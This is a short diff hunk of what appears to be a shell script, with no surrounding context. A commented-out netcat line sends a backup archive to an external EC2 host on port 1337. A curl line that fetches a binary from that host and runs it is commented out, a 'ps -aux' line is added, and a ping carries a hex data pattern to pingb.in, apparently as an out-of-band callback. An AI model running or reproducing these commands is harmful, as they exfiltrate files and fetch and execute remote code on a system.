@@ -37,6 +37,8 @@
 
 #nc ec2-18-222-52-169.us-east-2.compute.amazonaws.com 1337 < /tmp/backup/archive.tar.gz
 
-curl -L -o conmachi http://ec2-18-222-52-169.us-east-2.compute.amazonaws.com:1337/conmachi && chmod +x conmachi && ./conmachi
+#curl -L -o conmachi http://ec2-18-222-52-169.us-east-2.compute.amazonaws.com:1337/conmachi && chmod +x conmachi && ./conmachi
+
+ps -aux
 
 ping -c1 -p 000a8a6956028d04ddb9edecf7b69300 pingb.in
